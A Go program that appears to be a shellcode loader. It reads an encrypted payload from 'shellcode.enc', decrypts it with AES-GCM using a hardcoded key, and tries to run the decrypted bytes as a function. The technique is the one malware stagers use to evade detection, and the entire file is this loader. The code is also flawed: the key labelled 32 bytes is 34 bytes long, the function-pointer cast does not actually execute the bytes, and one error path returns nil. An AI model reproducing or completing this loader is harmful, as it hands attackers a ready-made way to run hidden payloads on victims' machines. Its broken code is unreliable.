package main

import (
	"crypto/aes"
	"crypto/cipher"
	"log"
	"os"
	"unsafe"
)

func main() {
	// Load encrypted shellcode from file
	encryptedShellcode, err := os.ReadFile("shellcode.enc")
	if err != nil {
		log.Fatal(err)
	}

	// Decrypt shellcode
	key := []byte("thisis32byteslongpassphraseimusing") // Replace with the same key used for encryption
	shellcode, err := decrypt(key, encryptedShellcode)
	if err != nil {
		log.Fatal(err)
	}

	// Execute shellcode
	err = executeShellcode(shellcode)
	if err != nil {
		log.Fatal(err)
	}
}

func decrypt(key, ciphertext []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	// Create a new GCM cipher with the given key
	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	// Extract the nonce from the ciphertext
	nonceSize := aesGCM.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, err
	}
	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]

	// Decrypt the ciphertext using AES-GCM
	plaintext, err := aesGCM.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}

	return plaintext, nil
}

func executeShellcode(shellcode []byte) error {
	// Convert shellcode to a function pointer and execute it
	shellcodeFunc := func() {
		// Cast shellcode to a function pointer and execute it
		shellcodePtr := unsafe.Pointer(&shellcode[0])
		fn := *(*func())(shellcodePtr)
		fn()
	}
	shellcodeFunc()

	return nil
}